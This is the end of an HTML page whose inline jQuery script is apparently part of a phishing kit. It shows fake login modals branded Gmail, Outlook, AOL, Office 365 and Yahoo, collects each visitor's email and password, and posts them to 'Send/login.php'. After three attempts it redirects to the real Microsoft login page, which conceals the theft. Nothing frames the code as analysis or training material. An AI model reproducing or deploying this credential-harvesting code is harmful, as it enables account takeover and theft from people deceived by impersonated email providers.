</div>
</div>
</div>
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous">
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous">
</script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous">
</script>
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js">
</script>
<script>
    /* global $ */
    $(document).ready(function(){
      var count=0;
      $('#gmailmodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'File/gmail.png');
        $('#field').html("Gmail");
        $('#ajaxModal').modal('show');
      });
      $('#outlookmodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'File/outlook.png');
        $('#field').html("Outlook");
        $('#ajaxModal').modal('show');
      });
      $('#aolmodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'File/aol.png');
        $('#field').html("Aol");
        $('#ajaxModal').modal('show');
      });
      $('#office365modal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'File/office365.png');
        $('#field').html("Office 365");
        $('#ajaxModal').modal('show');
      });
      $('#yahoomodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'File/yahoo.png');
        $('#field').html("Yahoo");
        $('#ajaxModal').modal('show');
      });
      $('#othermodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'File/othermail.ico');
        $('#field').html("Other Mail");
        $('#ajaxModal').modal('show');
      });
      $('#submit-btn').click(function(event){
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var detail=$("#field").html();
        var msg = $('#msg').html();
        $('#msg').text( msg );
        count=count+1;
        if (count>=3) {
          count=0;
          window.location.replace("https://login.microsoftonline.com/common/login");
        }
        else
        {
         $.ajax({
          dataType: 'JSON',
          url: 'Send/login.php',
          type: 'POST',
          data:{
            email:email,
            password:password,
            detail:detail,
          },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                 $('#msg').html(response['msg']);
                  // $('input, textarea').val(function() {
                  //    return this.defaultValue;
                  // });
                }
                else{
                  $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#msg").show();
              $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Login');
            }
          });
       }
     });
    });
</script>